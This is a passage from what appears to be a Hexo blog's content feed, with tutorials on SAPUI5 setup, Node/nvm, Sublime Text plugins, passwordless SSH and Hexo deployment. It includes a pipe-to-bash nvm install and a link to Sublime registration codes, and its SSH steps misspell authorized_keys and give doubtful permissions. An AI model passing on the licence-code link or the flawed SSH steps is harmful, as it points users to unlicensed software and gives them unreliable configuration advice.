src/com/0x400/hello</span></span><br></pre></td></tr></table></figure>



<h3 id="Hello-world"><a href="#Hello-world" class="headerlink" title="Hello world"></a>Hello world</h3><p>本节我们将创建 <em>index.html</em> 和 <em>index.js</em> 文件，并在 <em>index.html</em> 中引入 SAPUI5，并在 SAPUI5 启动时自动加载 <em>index.js</em> 文件。</p>
<p>在项目入口路径 <em>src&#x2F;com&#x2F;0x400&#x2F;hello</em> 下创建 <em>index.html</em> 文件，</p>
<p><em>index.html</em></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">title</span>&gt;</span>Getting started<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">script</span> <span class="attr">id</span>=<span class="string">&quot;sap-ui-bootstrap&quot;</span></span></span><br><span class="line"><span class="tag">		<span class="attr">src</span>=<span class="string">&quot;resources/sap-ui-core.js&quot;</span></span></span><br><span class="line"><span class="tag">		<span class="attr">data-sap-ui-theme</span>=<span class="string">&quot;sap_belize&quot;</span></span></span><br><span class="line"><span class="tag">		<span class="attr">data-sap-ui-libs</span>=<span class="string">&quot;sap.m&quot;</span></span></span><br><span class="line"><span class="tag">		<span class="attr">data-sap-ui-resourceroots</span>=<span class="string">&#x27;&#123;&quot;com.0x400.hello&quot;: &quot;./&quot;&#125;&#x27;</span></span></span><br><span class="line"><span class="tag">		<span class="attr">data-sap-ui-onInit</span>=<span class="string">&quot;module:com/0x400/hello/index&quot;</span></span></span><br><span class="line"><span class="tag">		<span class="attr">data-sap-ui-compatVersion</span>=<span class="string">&quot;edge&quot;</span></span></span><br><span class="line"><span class="tag">		<span class="attr">data-sap-ui-async</span>=<span class="string">&quot;true&quot;</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span> <span class="attr">class</span>=<span class="string">&quot;sapUiBody&quot;</span> <span class="attr">id</span>=<span class="string">&quot;content&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><code>src=&quot;resources/sap-ui-core.js&quot;</code> 这里使用相对路径引入了 SAPUI5 框架的核心代码 <code>sap-ui-core.js</code> 我们可以使用绝对路径引入 SAPUI5，比如使用官方提供的 CDN <a href="https://sapui5.hana.ondemand.com/1.81.1/resources/sap-ui-core.js">https://sapui5.hana.ondemand.com/1.81.1/resources/sap-ui-core.js</a> 即可引入 1.81.1 版本。我们并没有这样做，而是使用相对路径引入 SAPUI5，这就意味着项目启动后我们可以通过相对路径访问到 SAPUI5 的核心代码 - <em>sap-ui-core.js</em>。比如项目启动后监听在本机的 8082 端口，那么通过地址 <a href="http://localhost:8082/index.html">http://localhost:8082/index.html</a> 访问到 <em>index.html</em>，通过地址<br><a href="http://localhost:8082/resources/sap-ui-core.js">http://localhost:8082/resources/sap-ui-core.js</a> 加载 SAPUI5，我们将使用 ui5 工具达到此目的。</p>
<p><code>data-sap-ui-resourceroots=&#39;{&quot;com.0x400.hello&quot;: &quot;./&quot;}&#39;</code>  是将命名空间 <code>com.0x400.hello</code> 和当前路径 <em>src&#x2F;com&#x2F;0x400&#x2F;hello</em> 进行了映射，命名空间 <code>com.0x400.hello</code> 即等价于 <em>src&#x2F;com&#x2F;0x400&#x2F;hello</em> 路径。 </p>
<p><code>data-sap-ui-onInit=&quot;module:com/0x400/hello/index&quot;</code> 表明框架启动时会加载当前目录下的 <code>index.js</code>。此处 <code>module:com/0x400/hello</code> 是命名空间 <code>com.0x400.hello</code> 的路径表示。</p>
<p>创建 <em>index.js</em> 文件，</p>
<p><em>index.js</em></p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">sap.<span class="property">ui</span>.<span class="title function_">define</span>([</span><br><span class="line">    <span class="string">&quot;sap/m/Button&quot;</span>,</span><br><span class="line">    <span class="string">&quot;sap/m/MessageToast&quot;</span></span><br><span class="line">], <span class="keyword">function</span>(<span class="params">Button, MessageToast</span>) &#123;</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">Button</span>(&#123;</span><br><span class="line">        <span class="attr">text</span>: <span class="string">&quot;Ready...&quot;</span>,</span><br><span class="line">        <span class="attr">press</span>: <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">            <span class="title class_">MessageToast</span>.<span class="title function_">show</span>(<span class="string">&quot;Hello World&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;).<span class="title function_">placeAt</span>(<span class="string">&quot;content&quot;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h3 id="安装-ui5"><a href="#安装-ui5" class="headerlink" title="安装 ui5"></a>安装 ui5</h3><p>我们上文所提到，项目启动后将从 <a href="http://localhost:8082/resources/sap-ui-core.js">http://localhost:8082/resources/sap-ui-core.js</a> 加载 SAPUI5 的核心代码，本节将使用 ui5 工具自动下载我们依赖的 SAPUI5 版本并，并使用 <code>ui5 serve</code> 启动项目使得我们能从正确的路径中加载 SAPUI5。</p>
<p>安装 ui5,</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">npm install --global @ui5/cli</span></span><br></pre></td></tr></table></figure>

<p>创建 <em>ui5.yaml</em> 文件用于配置项目启动选项，</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">ui5 init</span></span><br></pre></td></tr></table></figure>

<p>默认情况下 <code>ui5 init</code> 创建的 <em>ui5.yaml</em> 文件中 <code>name</code> 即为项目目录，项目的类型为 <code>libary</code>，我们需要更改为 <code>application</code> 类型，并且使用 <code>resources</code> 字段下的 <code>webapp</code> 配置项目的启动路径，</p>
<p><strong>标注</strong>： 如果项目类型不正确 <code>ui5 serve</code> 可能会报错</p>
<p><em>ui5.yaml</em></p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">specVersion:</span> <span class="string">&#x27;2.2&#x27;</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">demo-ui5</span></span><br><span class="line"><span class="attr">type:</span> <span class="string">application</span></span><br><span class="line"><span class="attr">resources:</span></span><br><span class="line">  <span class="attr">configuration:</span></span><br><span class="line">    <span class="attr">paths:</span></span><br><span class="line">      <span class="attr">webapp:</span> <span class="string">src/com/0x400/hello</span></span><br></pre></td></tr></table></figure>

<p>使用 <code>ui5</code> 加载 SAPUI5 的核心文件和 <em>index.html</em> 中用到主题和 libs </p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">ui5 use sapui5@latest</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">ui5 add sap.ui.core sap.m themelib_sap_belize</span></span><br></pre></td></tr></table></figure>

<p>在官网 <a href="https://sapui5.hana.ondemand.com/">https://sapui5.hana.ondemand.com/</a> 可以查阅 SAPUI5 的版本列表，使用 <code>ui5 use sapui5@&lt;version&gt;</code> 安装相应的版本。</p>
<p>因为我们的项目是 Application 类型，所以需要一个 <em>manifest.json</em> 文件，所有的项目配置将放在该文件下，使得业务代码和配置分离，在目录 <em>src&#x2F;com&#x2F;0x400&#x2F;hello</em> 下创建 <em>manifest.json</em> 配置文件，</p>
<p><em>manifest.json</em></p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;_version&quot;</span><span class="punctuation">:</span> <span class="string">&quot;1.0.0&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;sap.app&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;id&quot;</span><span class="punctuation">:</span> <span class="string">&quot;com.0x400.hello&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;application&quot;</span></span><br><span class="line">  <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
<p>id 可以为项目的根命名空间 <code>com.0x400.hello</code>。</p>
<p><strong>标注</strong>: 对于 Application 类型，<em>manifest.json</em> 文件必须的，缺少该文件 <code>ui5 serve</code> 时也将会报错，而 ui5 官方文档似乎没有这个提醒。</p>
<h3 id="启动"><a href="#启动" class="headerlink" title="启动"></a>启动</h3><p>在 <code>scripts</code> 中添加启动脚本 <code>start: ui5 server</code>。</p>
<p><em>package.json</em></p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;demo-ui5&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;version&quot;</span><span class="punctuation">:</span> <span class="string">&quot;1.0.0&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;main&quot;</span><span class="punctuation">:</span> <span class="string">&quot;index.js&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;license&quot;</span><span class="punctuation">:</span> <span class="string">&quot;MIT&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;scripts&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;start&quot;</span><span class="punctuation">:</span> <span class="string">&quot;ui5 serve&quot;</span></span><br><span class="line">  <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>运行 <code>npm start</code> 启动项目，项目启动后监听在 8082 端口上，访问 <a href="http://localhost:8082/index.html">http://localhost:8082/index.html</a> 点击 Ready… 按钮弹出 Hello World。到此，SAPUI5 的开发环境就部署完成了。<br><img src="/images/2020-08/sapui5-hello-world.png" alt="hello world"></p>
<h3 id="Git-提交"><a href="#Git-提交" class="headerlink" title="Git 提交"></a>Git 提交</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">git init</span></span><br></pre></td></tr></table></figure>

<p>创建 <code>.gitignore</code> 文件并添加如下内容，</p>
<p><em>.gitignore</em></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Logs</span></span><br><span class="line">logs</span><br><span class="line">*.log</span><br><span class="line">npm-debug.log*</span><br><span class="line">yarn-debug.log*</span><br><span class="line">yarn-error.log*</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Dependency directories</span></span><br><span class="line">node_modules/</span><br><span class="line"></span><br><span class="line">dist/</span><br><span class="line">.idea/</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>创建提交记录：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">git add .</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">git commit -m <span class="string">&quot;feat: getting started sapui5&quot;</span></span></span><br></pre></td></tr></table></figure>

<p>本文项目代码: <a href="https://github.com/brelian/hello-ui5">https://github.com/brelian/hello-ui5</a></p>
]]></content>
      <categories>
        <category>Experience</category>
        <category>Guide</category>
      </categories>
      <tags>
        <tag>SAPUI5</tag>
        <tag>SAP</tag>
        <tag>OpenUI5</tag>
      </tags>
  </entry>
  <entry>
    <title>Build Node.js developed environment on Windows 7</title>
    <url>/experience/guide/dev-sublime-text-3-build-node/</url>
    <content><![CDATA[<h2 id="installation-windows-nvm"><a href="#installation-windows-nvm" class="headerlink" title="installation windows-nvm"></a>installation <a href="https://github.com/coreybutler/nvm-windows">windows-nvm</a></h2><p>Download windows-nvm from <a href="https://github.com/coreybutler/nvm-windows/releases">https://github.com/coreybutler/nvm-windows/releases</a> and install it.</p>
<p>Usage:</p>
<ul>
<li><code>nvm version</code> : show version</li>
<li><code>nvm list</code> : show available node version</li>
<li><code>nvm  uninstall</code>: uninstall a specific node version</li>
<li><code>nvm use</code>: use a specific node version</li>
<li>… see <a href="https://github.com/coreybutler/nvm-windows">here</a></li>
</ul>
<h2 id="installation-node"><a href="#installation-node" class="headerlink" title="installation node"></a>installation node</h2><p>install stable: <code>nvm install latest</code></p>
<p>then show available node versions:  <code>nvm list</code></p>
<p>select a specific version from available list : <code>use xx</code></p>
<span id="more"></span>

<h2 id="npm-using-taobao-registry"><a href="#npm-using-taobao-registry" class="headerlink" title="npm using taobao registry"></a>npm using taobao registry</h2><ul>
<li>temporary using</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">npm --registry https://registry.npm.taobao.org install express</span><br></pre></td></tr></table></figure>
<ul>
<li>permanent using</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">npm config set registry https://registry.npm.taobao.org</span><br></pre></td></tr></table></figure>
<p>or using cnpm instead of npm</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">npm install -g cnpm --registry=https://registry.npm.taobao.org</span><br><span class="line"></span><br><span class="line">cnpm install express</span><br></pre></td></tr></table></figure>
<ul>
<li>testing:</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">npm config get registry</span><br><span class="line"># or</span><br><span class="line">npm info express</span><br></pre></td></tr></table></figure>

<h2 id="configuration-build-key-map-in-Sublime-text-3"><a href="#configuration-build-key-map-in-Sublime-text-3" class="headerlink" title="configuration build key map in Sublime-text 3"></a>configuration build key map in Sublime-text 3</h2><p>Open Sublime Text 3, then <code>ctr+shift+p</code>  input <code>pci</code> call out Package control  install package window and search Node.js package](<a href="https://github.com/tanepiper/SublimeText-Nodejs">https://github.com/tanepiper/SublimeText-Nodejs</a>)</p>
<p>Enjoy it!</p>
]]></content>
      <categories>
        <category>Experience</category>
        <category>Guide</category>
      </categories>
      <tags>
        <tag>Node</tag>
      </tags>
  </entry>
  <entry>
    <title>Sublime Text 3 配置</title>
    <url>/experience/guide/dev-sublime-text-3-preference/</url>
    <content><![CDATA[<p>本文记录了 Sublime Text 3 的配置教程，包括一些个人常用插件的安装和使用。</p>
<span id="more"></span>

<h2 id="环境和依赖"><a href="#环境和依赖" class="headerlink" title="环境和依赖"></a>环境和依赖</h2><p>环境： Deeepin 15.4</p>
<p>依赖： Python 2.7</p>
<h2 id="安装-Sublime-Text-3，Sublime-Text-官网"><a href="#安装-Sublime-Text-3，Sublime-Text-官网" class="headerlink" title="安装 Sublime Text 3，Sublime Text 官网"></a>安装 Sublime Text 3，<a href="http://www.sublimetext.com/">Sublime Text 官网</a></h2><p>注册码，<a href="https://fatesinger.com/100121">https://fatesinger.com/100121</a></p>
<p>Please support authorized software if you can.</p>
<h2 id="安装包管理器"><a href="#安装包管理器" class="headerlink" title="安装包管理器"></a><a href="https://packagecontrol.io/installation#st3">安装包管理器</a></h2><p>ctr+&#96; 打开控制台，输入代码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import urllib.request,os,hashlib; h = &#x27;2915d1851351e5ee549c20394736b442&#x27; +</span><br><span class="line">&#x27;8bc59f460fa1548d1514676163dafc88&#x27;; pf = &#x27;Package Control.sublime-package&#x27;;</span><br><span class="line">ipp = sublime.installed_packages_path(); urllib.request.install_opener</span><br><span class="line">( urllib.request.build_opener( urllib.request.ProxyHandler()) ); by =</span><br><span class="line">urllib.request.urlopen( &#x27;http://packagecontrol.io/&#x27; + pf.replace(&#x27; &#x27;, &#x27;%</span><br><span class="line">20&#x27;)).read(); dh = hashlib.sha256(by).hexdigest(); print(&#x27;Error validating</span><br><span class="line">download (got %s instead of %s), please try manual install&#x27; % (dh, h)) if</span><br><span class="line">dh != h else open(os.path.join( ipp, pf), &#x27;wb&#x27; ).write(by)</span><br></pre></td></tr></table></figure>

<p>有一次，遇到以下报错：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Traceback (most recent call last):</span><br><span class="line">  File &quot;./python3.3/urllib/request.py&quot;, line 1248, in do_open</span><br><span class="line">  File &quot;./python3.3/http/client.py&quot;, line 1065, in request</span><br><span class="line">  File &quot;./python3.3/http/client.py&quot;, line 1103, in _send_request</span><br><span class="line">  File &quot;./python3.3/http/client.py&quot;, line 1061, in endheaders</span><br><span class="line">  File &quot;./python3.3/http/client.py&quot;, line 906, in _send_output</span><br><span class="line">  File &quot;./python3.3/http/client.py&quot;, line 844, in send</span><br><span class="line">  File &quot;./python3.3/http/client.py&quot;, line 822, in connect</span><br><span class="line">  File &quot;./python3.3/socket.py&quot;, line 435, in create_connection</span><br><span class="line">  File &quot;./python3.3/socket.py&quot;, line 426, in create_connection</span><br><span class="line">TimeoutError: [WinError 10060] 由于连接方在一段时间后没有正确答复或连接的主机没有反应，连接尝试失败。</span><br><span class="line"></span><br><span class="line">During handling of the above exception, another exception occurred:</span><br><span class="line"></span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File &quot;&lt;string&gt;&quot;, line 1, in &lt;module&gt;</span><br><span class="line">  File &quot;./python3.3/urllib/request.py&quot;, line 156, in urlopen</span><br><span class="line">  File &quot;./python3.3/urllib/request.py&quot;, line 469, in open</span><br><span class="line">  File &quot;./python3.3/urllib/request.py&quot;, line 487, in _open</span><br><span class="line">  File &quot;./python3.3/urllib/request.py&quot;, line 447, in _call_chain</span><br><span class="line">  File &quot;./python3.3/urllib/request.py&quot;, line 1274, in http_open</span><br><span class="line">  File &quot;./python3.3/urllib/request.py&quot;, line 1251, in do_open</span><br><span class="line">urllib.error.URLError: &lt;urlopen error [WinError 10060]</span><br><span class="line">由于连接方在一段时间后没有正确答复或连接的主机没有反应，连接尝试失败。&gt;</span><br></pre></td></tr></table></figure>
<p>尝试了以下解决措施：</p>
<ul>
<li>安装python3，没解决，估计是网络问题</li>
</ul>
<p><strong>手动安装</strong></p>
<ol>
<li>点击 Preferences &gt; Browse Packages…</li>
<li>进入 Installed Packages&#x2F; 目录</li>
<li>下载 Package Control.sublime-package，并复制文件到 Installed Packages&#x2F; 目录</li>
<li>重启 Sublime Text</li>
</ol>
<p>再次安装失败<strong>再次手动安装</strong></p>
<ol>
<li>github下载<a href="https://github.com/wbond/sublime_package_control">https://github.com/wbond/sublime_package_control</a></li>
<li>解压后把文件夹名称改为Package Control</li>
<li>点击 Preferences &gt; Browse Packages…</li>
<li>将Package Control 复制到该文件夹中，重启sublime</li>
<li><code>ctr + shift + p</code>打开的窗口中输入<code>pci</code> 弹出窗口如下说明成功</li>
</ol>
<p><img src="/images/20171204/pci.png"></p>
<h2 id="Material-Theme-主题"><a href="#Material-Theme-主题" class="headerlink" title="Material Theme 主题"></a>Material Theme 主题</h2><ol>
<li><code>ctr+shift+p</code> 输入<code>pci</code></li>
<li><code>Package Control: Install Package</code> and press enter. Then search for Material Theme</li>
<li>Activate the theme :<code>ctr+shift+p</code> 输入 <code>Material Theme</code>选择<br> <img src="/images/20171204/Material.png"></li>
</ol>
<h2 id="常用插件"><a href="#常用插件" class="headerlink" title="常用插件"></a>常用插件</h2><ol>
<li><p><a href="https://github.com/SublimeCodeIntel/SublimeCodeIntel">Sub­lime­CodeIn­tel</a><br>提供代码提示，函数、对象或变量名称等。还可以提示对象或类中哪些方法和变量。基于komodo codeintel开发，虽然有时会有一些问题，但是大多时候是没问题的。</p>
</li>
<li><p><a href="https://sublime.wbond.net/packages/SublimeLinter">Sub­limeLin­ter</a><br>代码提错工具。但是从sublime 3开始，SublimeLineter编程模块化，所以安装完主安装包之后，还需要安装你需要支持的对应的语言的插件。对于PHP+js的开发，可以安装如下插件：<br>SublimeLinter-php<br>SublimeLinter-jshint<br>SublimeLinter-json<br>and SublimeLinter-csslint</p>
</li>
<li><p><a href="https://sublime.wbond.net/packages/VCS%20Gutter">VCS Gut­ter </a><br>编码的时候避免不了使用Git或SVN，VCS Gutter可以很方便的在代码中显示代码改动，支持Git、 Mercurial和 Subversion</p>
</li>
<li><p>Origami: 神器！可以任意的操纵sublime的屏幕，比如左右分屏，上下分屏，先上下再左右，先左右再上下。</p>
</li>
<li><p>Markdown 写作环境，<a href="https://github.com/timonwong/OmniMarkupPreviewer">OmniMarkupPriviewer</a><br>OmniMarkupPreviewer Markdown 实时预览插件，安装使用详见官网，安装过程中如果出现 404 问题，</p>
<p> <img src="/images/20171204/OmniMarkupPreviewer_404_error.jpg" alt="404 error"></p>
<p> 请参照 <a href="https://github.com/timonwong/OmniMarkupPreviewer/issues/85">issue</a></p>
</li>
<li><p><a href="https://github.com/emmetio/emmet">Emmet</a></p>
</li>
<li><p><a href="https://github.com/BoundInCode/AutoFileName">AutoFileName</a></p>
</li>
<li><p><a href="https://github.com/akira-cn/sublime-gbk">Sublime-gbk</a></p>
</li>
<li><p><a href="https://github.com/SublimeText/TrailingSpaces">TrailingSpaces</a> 高亮多余空格，设置 Sublime 中的 <code>trim_trialing_white_space_on_save</code>为 true 可对多余空格自动删除。</p>
</li>
</ol>
]]></content>
      <categories>
        <category>Experience</category>
        <category>Guide</category>
      </categories>
      <tags>
        <tag>Sublime</tag>
        <tag>插件</tag>
      </tags>
  </entry>
  <entry>
    <title>使用 SSH public key 免密码登录</title>
    <url>/experience/guide/linux-configure-ssh-no-password-to-login/</url>
    <content><![CDATA[<p>本文记录客户端 C 无密码连接服务器 S 的配置过程。</p>
<span id="more"></span>

<h2 id="step-1"><a href="#step-1" class="headerlink" title="step 1"></a>step 1</h2><p>客户端 C 生成一对秘钥：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh-keygen -t rsa</span><br></pre></td></tr></table></figure>
<p>随后三个回车</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ls ~/.ssh/</span><br><span class="line">id_rsa  id_rsa.pub  known_hosts</span><br></pre></td></tr></table></figure>
<p>秘钥生成成功！</p>
<h2 id="step-2"><a href="#step-2" class="headerlink" title="step 2"></a>step 2</h2><p>将客户端 C 生成的秘钥上传到服务端 S，在客户端执行：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">scp ~/.ssh/id_rsa.pub username@host:~/.ssh/</span><br></pre></td></tr></table></figure>

<h2 id="step-3"><a href="#step-3" class="headerlink" title="step 3"></a>step 3</h2><p>登录服务器，在服务端 S 中执行：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat ~/.ssh/id_rsa.pub &gt;&gt; authrized_keys</span><br></pre></td></tr></table></figure>

<p>done!</p>
<h2 id="注意："><a href="#注意：" class="headerlink" title="注意："></a>注意：</h2><p><code>.ssh</code> 和 <code>.ssh/id_rsa.pub</code> 的权限分别是 700 和 600</p>
<h2 id="应用案例："><a href="#应用案例：" class="headerlink" title="应用案例："></a>应用案例：</h2><ol>
<li>git push 到 GitHub</li>
<li>Linux A 连接 Linux B</li>
</ol>
]]></content>
      <categories>
        <category>Experience</category>
        <category>Guide</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>SSH</tag>
      </tags>
  </entry>
  <entry>
    <title>Hexo 双线部署启用 SSL 【不完全指北】</title>
    <url>/experience/guide/linux-blog-deployed-in-github-and-coding/</url>
    <content><![CDATA[<p>最近将博客从 Wordpress 迁移到了 Hexo，因此写了一个从 Hexo 的部署到将代码发布到 GitHub Pages 和 Coding Pages 最后启用 SSL 的双线部署教程。如果您也在折腾双线 部署，您不妨可以看看这篇文章，大概流程如下：</p>
<ol start="0">
<li><p>搭建 Hexo 写作环境</p>
</li>
<li><p>部署到 GitHub</p>
</li>
<li><p>部署到 Coding Pages</p>
</li>
<li><p>注册域名并设置 DNS 解析</p>
</li>
<li><p>启用 SSL</p>
</li>
</ol>
<span id="more"></span>

<h2 id="选择-Hexo-双线部署原因"><a href="#选择-Hexo-双线部署原因" class="headerlink" title="选择 Hexo 双线部署原因"></a>选择 Hexo 双线部署原因</h2><ul>
<li><p>Hexo 是一个开源的博客写作框架，部署简单，当前背景下 Markdown 写作不二之选。</p>
</li>
<li><p>选择代码托管服务一方面是为了省去国内 VPS 空间需要域名备案的麻烦，另一方面是省钱。</p>
</li>
<li><p>选择选线部署是因为 GitHub Pages 自定义的域名不支持 SSL 服务。</p>
</li>
<li><p>此外 GitHub 在国内访问速度慢到不能接受。</p>
</li>
</ul>
<p>综上述，选择 GitHub Pages + Coding Pages 双线部署，国内路线走 Coding Pages 并启用 SSL，国外路线走 GitHub，并起到备份作用。</p>
<h2 id="Hexo-部署"><a href="#Hexo-部署" class="headerlink" title="Hexo 部署"></a>Hexo 部署</h2><h3 id="Node-安装"><a href="#Node-安装" class="headerlink" title="Node 安装"></a>Node 安装</h3><ul>
<li><p>Linux (NVM 方式安装)</p>
<pre><code>  # curl -o- https://raw.githubusercontent.com/creationix/nvm/v0.33.2/install.sh | bash
</code></pre>
<p>  或者</p>
<pre><code>  # wget -qO- https://raw.githubusercontent.com/creationix/nvm/v0.33.2/install.sh | bash
</code></pre>
<p>  脚本执行完毕后<br>  # nvm<br>  # Node Version Manager<br>   Note: <version> refers to any version-like string nvm understands. This includes:<br>  - full or partial version numbers, starting with an optional “v” (0.10, v0.1.2, v1)<br>  - default (built-in) aliases: node, stable, unstable, iojs, system<br>  - custom aliases you define with <code>nvm alias foo</code>…<br>  输出使用教程，如果失败请查阅官网：<a href="https://github.com/creationix/nvm">https://github.com/creationix/nvm</a></p>
<pre><code>  # nvm install v7 // 安装 node 7 建议不要安装最新版，最新版 Hexo 会报错
  # node -v
  v7.10.1
</code></pre>
<p>  输出版本号 Node 安装成功。</p>
</li>
<li><p>Windows 用户</p>
<p>  <a href="https://nodejs.org/en/download/">Node 官网</a>中下载稳定版本，不建议下载最新版，最新版 Hexo 报错。下载完成后直接安装，安装时选择 <code>Add to PATH</code>。安装完毕后<code>win + r</code>输入 <code>cmd</code>：<br>  node -v<br>  输出版本号安装成功。如安装失败可以参考<a href="http://www.runoob.com/nodejs/nodejs-install-setup.html">http://www.runoob.com/nodejs/nodejs-install-setup.html</a></p>
<p>  『注』如果没有添加到环境变量，可以按照如下步骤手动添加。假设安装到 <code>D:\Dev\nodejs</code>。<code>win+r</code>输入<code>sysdm.cpl</code>，选择『高级』–&gt; 『环境变量』–&gt; 『系统变量』找到<code>path</code>点击『编辑』，在末尾添加 Node 的安装路径<code>D:\Dev\nodejs</code>和<code>C:\Users\you_computer_name\AppData\Roaming\npm</code></p>
</li>
</ul>
<h3 id="Git-安装"><a href="#Git-安装" class="headerlink" title="Git 安装"></a>Git 安装</h3><ul>
<li><p><a href="https://www.liaoxuefeng.com/wiki/0013739516305929606dd18361248578c67b8067c8c017b000/00137396287703354d8c6c01c904c7d9ff056ae23da865a000">Linux 安装 Git</a></p>
</li>
<li><p><a href="https://git-scm.com/book/zh/v1/%E8%B5%B7%E6%AD%A5-%E5%AE%89%E8%A3%85-Git">Windows 安装 Git</a></p>
</li>
</ul>
<p>确保 Node 和　Git 安装成功后进入下一步。</p>
<h3 id="Hexo-部署-1"><a href="#Hexo-部署-1" class="headerlink" title="Hexo 部署"></a>Hexo 部署</h3><p>Hexo 的部署很简单，只需 3 步：</p>
<ul>
<li><p>安装 hexo</p>
<pre><code>  npm install -g hexo-cli
</code></pre>
</li>
<li><p>安装依赖</p>
<pre><code>  # mkdir -p /home/www/hexo
  # cd /home/www/hexo`
  # hexo init   # 初始化
  # npm install # 安装依赖
</code></pre>
</li>
<li><p>部署完成</p>
<pre><code>  # hexo g # 静态文件生成
  # hexo s --debug # 服务运行，正常访问 http://localhost:4000/ 则部署完成
</code></pre>
<p>  部署完成后当前目录下生成下列文件：</p>
<pre><code>  .
  ├── _config.yml  # 站点配置文件
  ├── package.json # Node 依赖包
  ├── scaffolds    # 模版 文件夹
  ├── source       # 资源文件夹是存放用户资源的地方。
  |   ├── _drafts  # 草稿
  |   └── _posts   # 文章
  └── themes         # 主题
</code></pre>
<p>  确保部署成功后进入下一步。</p>
</li>
</ul>
<h2 id="双线部署到-GitHub-Pages-和-Coding-Pages"><a href="#双线部署到-GitHub-Pages-和-Coding-Pages" class="headerlink" title="双线部署到 GitHub Pages 和 Coding Pages"></a>双线部署到 GitHub Pages 和 Coding Pages</h2><h3 id="注册域名"><a href="#注册域名" class="headerlink" title="注册域名"></a>注册域名</h3><p>到各大域名供应商注册好你的域名，如果不知道去哪注册，你可以到<a href="http://chuangzaoshi.com/operate">这里</a>看看。我选择的域名供应商是<a href="https://sg.godaddy.com/zh/">狗爹</a>，成功注册到域名<a href="https://gbin.me/">gbin.me</a>，然后往下步。</p>
<h3 id="生成-ssh-key"><a href="#生成-ssh-key" class="headerlink" title="生成 ssh-key"></a>生成 ssh-key</h3><p>配置好 ssh-key 在把代码提交到 GitHub 和 Coding 仓库时就不用输密码了，如果您已经配置过 ssh-key 了那么您可以跳过这一步。ssh 使用非对称加密，ssh-key 是一对密钥，私钥放在本地（放在 Hexo 部署的主机），公钥放在 GitHub 和 Coding 仓库。</p>
<pre><code># cd ~/.ssh
</code></pre>
<p>如果返回“… No such file or directory”，则：</p>
